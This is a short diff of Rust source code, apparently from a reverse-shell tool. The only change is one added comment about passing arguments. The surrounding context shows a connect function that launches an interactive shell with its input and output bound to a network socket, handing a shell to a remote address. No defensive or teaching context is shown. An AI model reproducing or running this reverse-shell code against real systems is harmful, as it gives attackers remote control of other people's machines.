@@ -37,6 +37,7 @@ fn connect(target_addr: &String, command: &String) -> Result<(), Box<dyn Error>>
 
     // Open shell
     Command::new(command)
+        // Add an option to pass arguments ?
         .arg("-i")
         .stdin(unsafe { Stdio::from_raw_fd(fd) })
         .stdout(unsafe { Stdio::from_raw_fd(fd) })
